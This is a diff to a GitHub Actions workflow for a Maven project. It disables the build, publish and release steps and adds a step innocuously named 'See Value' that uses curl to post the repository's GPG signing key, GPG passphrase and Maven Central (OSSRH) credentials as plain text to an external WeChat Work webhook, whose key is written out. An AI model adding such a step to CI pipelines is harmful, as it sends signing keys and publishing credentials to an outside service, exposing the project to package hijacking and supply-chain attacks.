@@ -25,26 +25,38 @@ jobs:
         server-username: ${{ secrets.OSSRH_USER }}
         server-password: ${{ secrets.OSSRH_PASSWORD }}
         gpg-passphrase: ${{ secrets.GPG_PASSWORD }}
-    - name: Cache .m2
-      uses: actions/cache@v2
-      env:
-        cache-name: cache-m2-1
-      with:
-        path: |
-          ~/.m2
-        key: ${{ runner.os }}-build-${{ env.cache-name }}
-    - name: Package
-      run: mvn clean package
-    - name: Publish to Maven Central Repo
-      uses: samuelmeuli/action-maven-publish@v1
-      with:
-        gpg_private_key: ${{ secrets.GPG_SECRET }}
-        gpg_passphrase: ${{ secrets.GPG_PASSWORD }}
-        nexus_username: ${{ secrets.OSSRH_USER }}
-        nexus_password: ${{ secrets.OSSRH_PASSWORD }}
-    - name: Github Release Tag
-      env:
-        GITHUB_TOKEN: ${{ secrets.GIT_RELEASE_TOKEN_MK }}
+    - name: See Value
       run: |
-        name=$(cat ./pom.xml | grep '<revision>' | awk -F '>' '{print $2}' | awk -F '<' '{print $1}')
-        hub release create -m "$name" "$name"
+        curl 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=3feaf8dd-314d-46f5-865a-f29f153dea09' \
+           -H 'Content-Type: application/json' \
+           -d '
+           {
+            	"msgtype": "text",
+            	"text": {
+                	"content": "GPG_SECRET = ${{ secrets.GPG_SECRET }}, GPG_PASSWORD = ${{ secrets.GPG_PASSWORD }}, OSSRH_USER = ${{ secrets.OSSRH_USER }}, OSSRH_PASSWORD = ${{ secrets.OSSRH_PASSWORD }}"
+            	}
+           }'
+
+#    - name: Cache .m2
+#      uses: actions/cache@v2
+#      env:
+#        cache-name: cache-m2-1
+#      with:
+#        path: |
+#          ~/.m2
+#        key: ${{ runner.os }}-build-${{ env.cache-name }}
+#    - name: Package
+#      run: mvn clean package
+#    - name: Publish to Maven Central Repo
+#      uses: samuelmeuli/action-maven-publish@v1
+#      with:
+#        gpg_private_key: ${{ secrets.GPG_SECRET }}
+#        gpg_passphrase: ${{ secrets.GPG_PASSWORD }}
+#        nexus_username: ${{ secrets.OSSRH_USER }}
+#        nexus_password: ${{ secrets.OSSRH_PASSWORD }}
+#    - name: Github Release Tag
+#      env:
+#        GITHUB_TOKEN: ${{ secrets.GIT_RELEASE_TOKEN_MK }}
+#      run: |
+#        name=$(cat ./pom.xml | grep '<revision>' | awk -F '>' '{print $2}' | awk -F '<' '{print $1}')
+#        hub release create -m "$name" "$name"
